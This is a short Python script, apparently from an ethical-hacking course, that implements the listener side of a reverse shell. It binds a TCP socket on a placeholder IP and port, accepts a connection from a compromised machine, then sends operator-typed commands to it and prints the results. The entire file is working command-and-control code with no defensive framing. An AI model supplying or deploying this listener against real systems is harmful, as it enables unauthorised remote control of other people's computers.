#!/usr/bin/env python

import socket


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[-] Waiting for incoming connections")
        self.con, address = listener.accept()
        print(f"[+] Connected with {str(address[0])}")

    def execute_remotely(self, command):
        self.con.send(command.encode())
        return self.con.recv(1024).decode()


    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)


listener = Listener("YOUR_IP", PORT)
listener.run()
